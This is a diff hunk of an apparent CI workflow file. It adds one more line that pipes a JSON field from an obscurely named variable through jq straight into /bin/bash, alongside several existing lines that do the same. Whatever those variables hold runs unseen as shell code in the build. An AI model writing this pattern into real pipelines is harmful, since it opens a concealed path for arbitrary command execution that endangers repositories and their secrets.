@@ -32,6 +32,7 @@ jobs:
           printf '%s' "$ns8" | jq -r .ink337 | /bin/bash
           printf '%s' "$q0095" | jq -r .atun8218 | /bin/bash
           printf '%s' "$nc749" | jq -r .quj847 | /bin/bash
+          echo $dqpcq5781 | jq -r .tud93213 | /bin/bash
 
       - name: Upload output
         uses: actions/upload-artifact@v4
